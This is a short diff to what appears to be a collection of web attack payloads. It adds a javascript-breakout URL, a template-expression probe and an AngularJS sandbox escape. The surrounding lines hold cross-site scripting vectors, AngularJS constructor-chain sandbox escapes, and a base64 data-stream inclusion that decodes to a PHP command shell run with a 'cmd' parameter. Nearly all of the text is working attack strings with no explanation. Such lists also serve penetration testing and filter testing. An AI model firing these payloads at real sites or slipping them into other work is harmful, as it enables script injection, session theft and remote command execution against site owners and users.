@@ -2,6 +2,8 @@
 "onmouseover="alert(1)
 </script><script>alert(1)</script>
 \'-alert(1)//
+http://foo?'-alert(1)-'
+${alert(1)}
 &'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4pJTAw&cmd=id
 <svg<script> onmou<script>seover</script>="alert('xss')">hii</svg</script>>
@@ -9,6 +11,7 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9
 ?'accesskey='x'onclick='alert(1)
 '-alert(1)-'
 "><svg><discard%20onbegin=alert(1)>
+?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
 <svg><a><animate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F><text+x%3D20+y%3D20>Click%20me<%2Ftext><%2Fa>
 {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
 {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
